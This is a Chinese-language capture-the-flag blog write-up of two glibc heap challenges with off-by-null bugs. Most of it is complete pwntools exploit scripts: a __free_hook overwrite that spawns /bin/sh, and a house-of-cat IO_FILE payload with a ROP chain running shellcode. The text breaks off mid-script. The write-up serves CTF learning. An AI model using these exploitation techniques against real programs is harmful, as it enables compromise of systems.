    <content type="html"><![CDATA[<h1 id="2023-Syctf-两道off-by-null"><a href="#2023-Syctf-两道off-by-null" class="headerlink" title="2023-Syctf-两道off-by-null"></a>2023-Syctf-两道off-by-null</h1><p>这次比赛跟着团队打的，师傅们很厉害，pwn直接AK了。我这个废物只能复现复现题目了。</p><p>这里笔者选取两道高版本的<strong>off by null</strong>题目复现。</p><p>一道题采用的是高版本无泄漏地址的堆风水绕过unlink，另一道采取泄露地址，伪造fake_chunk的方式绕过unlink。</p><h2 id="PWNPWN"><a href="#PWNPWN" class="headerlink" title="PWNPWN"></a>PWNPWN</h2><p>查看保护</p><p><img src="/img/2023-Syctf/image-20230709164811680.png" alt="image-20230709164811680"></p><p>保护全开。</p><p>首先，映入眼帘的是一个简单的随机数判断，通过便是常规的堆操作了。</p><p><img src="/img/2023-Syctf/image-20230709170659257.png" alt="image-20230709170659257"></p><p>取输入的数字的千位、百位、十位与个位，与rand()随机数匹配，匹配上了即可越过判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a = fun.rand() % <span class="hljs-number">10</span><br>b = fun.rand() % <span class="hljs-number">10</span><br>c = fun.rand() % <span class="hljs-number">10</span><br>d = fun.rand() % <span class="hljs-number">10</span><br><br>num = a * <span class="hljs-number">1000</span> + b * <span class="hljs-number">100</span> + c * <span class="hljs-number">10</span> + d<br>p.sendlineafter(<span class="hljs-string">&#x27;please input your number:&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br></code></pre></td></tr></table></figure><p>之后就是常规的菜单堆操作了。但是使用一些永假的判断混淆，没啥意义。还有一个登录关键字段的赋值，影响show与delete、edit等功能。</p><p><img src="/img/2023-Syctf/image-20230709170716152.png" alt="image-20230709170716152"></p><p>对输入passwd的长度以及最后一个字节的ascii值进行判断。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;\x03\x03\x03\x00&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nologin</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br></code></pre></td></tr></table></figure><p>add函数存在off-by-null漏洞。</p><p><img src="/img/2023-Syctf/image-20230709170733695.png" alt="image-20230709170733695"></p><p>要过libc2.31的unlink检测，需要经过比较复杂的堆风水操作。这里参考<a href="https://blog.wjhwjhn.com/archives/193/">WJH师傅</a>的博客。最终构造的fake chunk堆分布。</p><p><img src="/img/2023-Syctf/image-20230709170759170.png" alt="image-20230709170759170"></p><p>最终wp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64, u64<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwnpwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>fun = cdll.LoadLibrary(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>fun.srand(fun.time(<span class="hljs-number">0</span>))<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;root@$&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;\x03\x03\x03\x00&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nologin</span>():<br>    menu(<span class="hljs-number">5</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your username&#x27;</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;your passwd&#x27;</span>, <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content=<span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;your size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;your content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    nologin()<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    login()<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;your content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    login()<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;your index:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    a = fun.rand() % <span class="hljs-number">10</span><br>    b = fun.rand() % <span class="hljs-number">10</span><br>    c = fun.rand() % <span class="hljs-number">10</span><br>    d = fun.rand() % <span class="hljs-number">10</span><br><br>    num = a * <span class="hljs-number">1000</span> + b * <span class="hljs-number">100</span> + c * <span class="hljs-number">10</span> + d<br>    p.sendlineafter(<span class="hljs-string">&#x27;please input your number:&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    attack()<br><br>    add(<span class="hljs-number">8</span>, <span class="hljs-number">0xb460</span>)<span class="hljs-comment"># 使fake chunk的倒数第二个字节为&#x27;\x00&#x27;,需要爆破,1/16成功率</span><br><br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x4f0</span>)<br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x80</span>)<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    delete(<span class="hljs-number">5</span>)<br><br>    delete(<span class="hljs-number">2</span>)<br><br>    fake_size = <span class="hljs-number">0x461</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x470</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x450</span> + p64(<span class="hljs-number">0</span>) + p16(fake_size))<br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x430</span>)<br><br>    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x450</span>)<br>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x450</span>)<br><br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">3</span>)<br><br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x430</span>)<br><br>    delete(<span class="hljs-number">5</span>)<br>    delete(<span class="hljs-number">3</span>)<br>    add(<span class="hljs-number">7</span>, <span class="hljs-number">0x1000</span>)<br>    add(<span class="hljs-number">5</span>, <span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x438</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x430</span> + p64(<span class="hljs-number">0x460</span>))<br><br>    delete(<span class="hljs-number">4</span>)   <span class="hljs-comment"># trigger</span><br><br>    delete(<span class="hljs-number">1</span>)<br>    delete(<span class="hljs-number">6</span>)<br><br>    add(<span class="hljs-number">6</span>, <span class="hljs-number">0x10</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>)<br><br>    edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>    show(<span class="hljs-number">1</span>)<br><br>    libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecbe0</span><br>    lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>    delete(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">1</span>)<br><br>    edit(<span class="hljs-number">3</span>, p64(free_hook - <span class="hljs-number">8</span>))<br><br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x100</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>    <span class="hljs-comment"># dbg(command)</span><br><br>    delete(<span class="hljs-number">4</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = process(fn)<br>            pwn()<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">except</span>:<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170824876.png" alt="image-20230709170824876"></p><p>Tips：</p><p>实际上，压根不需要这么复杂的堆风水。由于我们可以很容易泄露出libc地址与堆地址，直接就可以通过伪造过掉unlink的检查。</p><h2 id="DE-CAT"><a href="#DE-CAT" class="headerlink" title="DE_CAT"></a>DE_CAT</h2><p>查看保护</p><p><img src="/img/2023-Syctf/image-20230709170017377.png" alt="image-20230709170017377"></p><p>保护全开。</p><p>题目就是常规的菜单堆题。</p><p>edit函数存在off-by-null漏洞。</p><p><img src="/img/2023-Syctf/image-20230709170840699.png" alt="image-20230709170840699"></p><p>show函数几乎没有任何限制的可以泄露出libc地址与堆地址。</p><p><img src="/img/2023-Syctf/image-20230709170854074.png" alt="image-20230709170854074"></p><p>这道题是libc-2.35的off-by-null，采用伪造fake_chunk的方式，可以直接过掉unlink检查。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = heap_base + <span class="hljs-number">0x1800</span><br>fake_size = <span class="hljs-number">0x4a0</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>edit(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></table></figure><p><img src="/img/2023-Syctf/image-20230709170912800.png" alt="image-20230709170912800"></p><p>题目开了沙盒，接下来就是house of cat一把梭了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./CAT_DE&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content=<span class="hljs-string">&#x27;a&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><br>shellcode = asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_cat</span>(<span class="hljs-params">fake_IO_file_addr</span>):<br>    payload = flat(<br>        &#123;<br>            <span class="hljs-number">0x20</span>: [<br>                    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <br>                    <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                    fake_IO_file_addr+<span class="hljs-number">0x150</span>,    <span class="hljs-comment"># rdx</span><br>                    setcontext + <span class="hljs-number">61</span><br>                ],<br>            <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,    <span class="hljs-comment"># chain</span><br>            <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,   <span class="hljs-comment"># _lock</span><br>            <span class="hljs-number">0x90</span>: fake_IO_file_addr + <span class="hljs-number">0x30</span>,  <span class="hljs-comment"># _IO_wide_data</span><br>            <span class="hljs-number">0xb0</span>: <span class="hljs-number">1</span>,    <span class="hljs-comment"># _mode</span><br>            <span class="hljs-number">0xc8</span>: _IO_wfile_jumps + <span class="hljs-number">0x30</span>,   <span class="hljs-comment"># fake_IO_wide_jumps</span><br>            <span class="hljs-number">0x100</span>: fake_IO_file_addr + <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0x140</span>: &#123;<br>                <span class="hljs-number">0xa0</span>: [fake_IO_file_addr + <span class="hljs-number">0x210</span>, ret]<br>            &#125;,<br>            <span class="hljs-number">0x200</span>: [<br>                pop_rdi_ret, fake_IO_file_addr &gt;&gt; <span class="hljs-number">12</span> &lt;&lt; <span class="hljs-number">12</span>,<br>                pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>                pop_rdx_rbx_ret, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>                pop_rax_ret, <span class="hljs-number">10</span>,    <span class="hljs-comment"># mprotect</span><br>                syscall_ret,<br>                fake_IO_file_addr+<span class="hljs-number">0x300</span>+<span class="hljs-number">0x10</span>,<br>            ],<br>            <span class="hljs-number">0x300</span>: shellcode,<br>        &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>    )<br><br>    <span class="hljs-keyword">return</span> payload<br><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x90</span>)  <span class="hljs-comment"># 1</span><br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x1000</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 2</span><br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>p.recv(<span class="hljs-number">10</span>)<br><br>heap_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>, heap_base)<br><br>key = (heap_base &gt;&gt; <span class="hljs-number">12</span>) + <span class="hljs-number">1</span><br><br>_IO_list_all = libc_base + <span class="hljs-number">0x21a680</span><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>_IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x21ba80</span><br>_IO_wfile_jumps = libc_base + <span class="hljs-number">0x2160c0</span><br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x0000000000090529</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br><br>add(<span class="hljs-number">0x420</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0xf8</span>)   <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x4f8</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0xf8</span>)   <span class="hljs-comment"># 6</span><br><br>fake_chunk = heap_base + <span class="hljs-number">0x1800</span><br>fake_size = <span class="hljs-number">0x4a0</span><br><br>payload = flat(<br>    &#123;<br>        <span class="hljs-number">0x80</span>: [<span class="hljs-number">0</span>, fake_size, fake_chunk, fake_chunk],<br>    &#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br>edit(<span class="hljs-number">3</span>, payload)<br><br>edit(<span class="hljs-number">4</span>, flat(&#123;<span class="hljs-number">0xf0</span>: fake_size&#125;))<br><br>delete(<span class="hljs-number">5</span>)   <span class="hljs-comment"># trigger</span><br><br>delete(<span class="hljs-number">6</span>)<br>delete(<span class="hljs-number">4</span>)<br><br>add(<span class="hljs-number">0x400</span>)  <span class="hljs-comment"># 4 </span><br><br>edit(<span class="hljs-number">4</span>, flat(&#123;<span class="hljs-number">0x390</span>: [<span class="hljs-number">0</span>, <span class="hljs-number">0x101</span>, key ^ _IO_list_all]&#125;))<br><br>add(<span class="hljs-number">0xf0</span>)  <span class="hljs-comment"># 